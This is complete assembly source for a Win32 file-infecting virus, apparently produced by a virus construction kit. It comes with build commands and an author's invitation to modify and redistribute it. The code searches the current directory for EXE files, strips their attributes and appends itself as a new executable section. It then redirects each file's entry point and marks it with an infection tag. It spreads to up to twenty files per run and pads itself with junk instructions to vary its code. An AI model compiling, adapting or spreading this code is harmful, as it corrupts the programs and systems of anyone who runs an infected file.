              
;
;
; Win32.NGVCK16 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK16
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 28
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 add esp, 4d
 mov eax, dword ptr [esp-4]
                                        ; mov ebp, eax
                                        ; clear ebp
 sub ebp, ebp
 add ebp, eax
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 push 0
 pop esi
 add esi, [edx+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 add esi, 28d
                                        ; get ATableVA
 mov edx, dword ptr [esi]
 add edx, [ebp+KernelMZ]
 xor ebx, 19140597d                     ; Trash
 mov dword ptr [ebp+ATableVA], edx
                                        ; add esi, 4
 inc esi
 add esi, 3d
                                        ; get NTableVA
 mov edx, dword ptr [esi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
                                        ; add esi, 4
 dec esi
 add esi, 5d
                                        ; get OTableVA
 mov edx, dword ptr [esi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
                                        ; mov eax, edx
 push edx
 pop eax
                                        ; mov edi, edx
 push edx
 pop edi
 mov dword ptr [ebp+TempApisearch2], -1
 and dword ptr [ebp+TempApisearch2], edi
 mov dword ptr [ebp+TempApisearch3], -1
 and dword ptr [ebp+TempApisearch3], ecx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 mov ebx, dword ptr [ecx]
 LoopChsksm:
                                        ; clear edx
 mov edx, -35911d
 add edx, 35911d
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 clc 
 sal dx,8d
 sub ebx, edx
 cmp dx, 0
 je LoopConti
                                        ; clear edx
 and edx, 0
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 sub ebx, edx
 cmp dx, 0
 jne LoopChsksm
LoopConti:
 dec ebx
 inc ebx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop eax
 mov ecx, dword ptr [ebp+TempApisearch3]
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add eax, 4
 add eax, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop ecx
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov ebx, edx
 movzx edx, word ptr [ebx]
 shl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 sub edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 inc ebx                                ; Trash
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 sub edx, edx

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 sub edx, -1d
 push edx
 push 80000000h or 40000000h
 mov esi, ebp
 add esi, offset WFD_szFileName

 push esi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 add dword ptr [ebp+Trash1], 904648     ; Trash
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
 push ebx

                                        ; clear edx
 and edx, 0
 push edx
 push ebx
 push edx
 push 00000004h
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 cmp eax, 0
 je CloseFile
 push ebx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]
 sbb ecx, 1d                            ; Trash

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
 adc ecx, 90205979d                     ; Trash
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, ( 276d xor 8d )
 xor edx, 8d
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, ebx


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 add ebx, 1d
 dec edx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edi, edx

 push edx
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edx, ebp
 add edx, offset WIN32_FIND_DATA

 push edx
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop ebx
                                        ; retrieve PE - Header
 mov esi, [ebx+3Ch]
 add esi, ebx
                                        ; get File Alignment
                                        ; add esi, 60
 dec esi
 add esi, 61d
 mov ecx, [esi]
 add esi, -60d
 mov dword ptr [ebp+filealign], -1
 and dword ptr [ebp+filealign], ecx
                                        ; clear esi
 sub esi, esi
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, esi
 add ebx, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 xor dword ptr [ebp+PEheader], ebx
                                        ; get old Entrypoint
 mov ecx, dword ptr [ebx+34h]
 mov dword ptr [ebp+OldBase], ecx
 mov edx, dword ptr [ebx+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], edx
 mov edx, [ebx+38h]
 mov dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov edx, [ebx+74h]
 shl edx, 3
                                        ; clear eax
 push 0
 pop eax
 mov ax, word ptr [ebx+6h]
 mov edi, 28h
 pushad
 mov eax, eax
 mul edi
 mov dword ptr [ebp+Misc1], -1
 and dword ptr [ebp+Misc1], eax
 popad
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+Misc1]
 add ebx, 78h
 add ebx, edx
 add ebx, eax
 lea ecx, [ebp+newsection]
 xchg ecx, edx


 xchg edx, ebx
 push edx
                                        ; Calculate the RVA of the new section
 mov ebx, [edx-5*8+8d]
 add ebx, [edx-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], ebx
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov eax, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], eax
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [ebp+nsvirtualsize], ecx
                                        ; calculate physical offset
 mov ebx,[edx-5*8+20d]
 add ebx,[edx-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], edx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+filealign]
 mov eax, edx
 mov dword ptr [ebp+AlignReg2], ebx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 call Align
 sub dword ptr [ebp+Trash1], edx        ; Trash
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 lea eax, [ebp+newsection]

 pop edx
                                        ; mov ecx, 16
 mov ecx, ( 16d xor 15d )
 xor ecx, 15d
WriteNewSectionLoop:
 mov ebx, dword ptr [eax]
 mov dword ptr [edx], ebx
                                        ; add edx, 4
 inc edx
 add edx, 3d
                                        ; add eax, 4
 inc eax
 add eax, 3d
 loop WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear eax
 sub eax, eax
 xor eax, dword ptr [ebp+PEheader]
 sub word ptr [eax+06h], -1
 mov edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [eax+28h], edx
                                        ; set infection mark
 mov dword ptr [eax+4Ch], 'NGVC'
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+nsphysicaloffset]
 push edx
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 sub eax, 1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 and dword ptr [ebp+Trash1], ebx        ; Trash
                                        ; mov edx, 20
 mov edx, ( 20d - 20d )
 add edx, 20d
 mov dword ptr [ebp+InfCounter], edx
 lea ecx, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
 cmp eax, 0
 je EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;                  [ ///// * Data * \\\\\ ]

Data:
 MapHandle   dd 0h

 AlignTemp   dd 0h
 FindHandle  dd 0h
 NewSize     dd 0h
 filemask    db '*.Exe',0
 MapAddress  dd 0h
 counter     dw 0h
 NTableVA    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

newsection:                           ; Settings for the new section
 nsname           db '.jnOVxAU'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 sectionalign   dd 0h
 NewEIP      dd 0h
 OldBase     dd 400000h
 Attributes  dd 0h
 TempApisearch3 dd 0h

 APINames:
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'

 KernelMZ    dd 0h
 TempAPI     dd 0h
 TempApisearch2 dd 0h
 filealign   dd 0h
 OTableVA    dd 0h
 PEheader    dd 0h

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XFindNextFileA         dd 0h
 XSetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XGetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h

 Trash1      dd 0h
 ATableVA    dd 0h
 InfCounter  dd 0h
 AlignReg2   dd 0h
 OldEIP      dd 0h
 Misc1       dd 0h
 AlignReg1   dd 0h
 KernelPE    dd 0h
 db 'Win32.NGVCK16 by SnakeByte',0
 FileHandle  dd 0h




;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
 or ebx, ecx                            ; Trash
                                        ; check for minimum filesize
 lea eax, [ebp+WFD_nFileSizeLow]
 xchg eax, ebx

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
 and ecx, edx                           ; Trash
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 rol eax, 29d                           ; Trash
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea esi, [ebp+WFD_szFileName]
 xchg esi, edx


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 dec eax
 add eax, 1
 jz NoInfection
                                        ; check for maximum filesize
 mov edx, dword ptr [ebp+WFD_nFileSizeHigh]
 cmp edx, 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je Goodfile
                                        ; clear eax
 mov eax, 0
 sub eax, 1
 inc eax
 jz Notagoodfile

Goodfile:
 cmp word ptr [ebx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 mov esi, dword ptr [ebx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],esi
 jb Notagoodfile
 add esi, ebx
                                        ; check for PE Header
                                        ; check for EP
 movzx edx, word ptr [esi]
 cmp edx, 'EP'
 je Goodfile2
                                        ; clear edx
 push 0
 pop edx
 or edx, edx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov dx, word ptr [esi+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov eax, dword ptr [ebp+Attributes]
 push eax
 lea eax, [ebp+WFD_szFileName]
 xchg eax, ecx

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 shr eax, 12d                           ; Trash
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 mov ecx, offset APINames
 add ecx, ebp

 mov esi, ebp
 add esi, offset APIOffsets


GetApisLoop: 

                                        ; search 'em
                                        ; ecx points to the CRC
                                        ; esi points to the offset
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], -1
 and dword ptr [esi], edx
                                        ; add esi, 4
 inc esi
 add esi, 3d
 dec ebx
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop edi

 mov dword ptr [ebp+retBase], edi

 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 inc ebp
 sub ebp, 1
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov esi, dword ptr [esp]
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ecx


                                        ; round to pages
 ror esi, 16d
 shl esi, 16d
                                        ; add esi, 1
 add esi, 1d
 and dword ptr [ebp+Trash1], 1121603    ; Trash
GetKernelLoop:
                                        ; clear eax
 xor eax, eax
 dec esi
 mov ax, word ptr [esi+03ch]
 test ax,0f800h
 jnz GetKernelLoop
 cmp esi, dword ptr [esi+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], esi
 mov eax, esi
 add eax, [esi+3Ch]
 mov [KernelPE+ebp], eax

 lea ebx, GetApis
 add ebx, ebp

 push ebx
ret


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

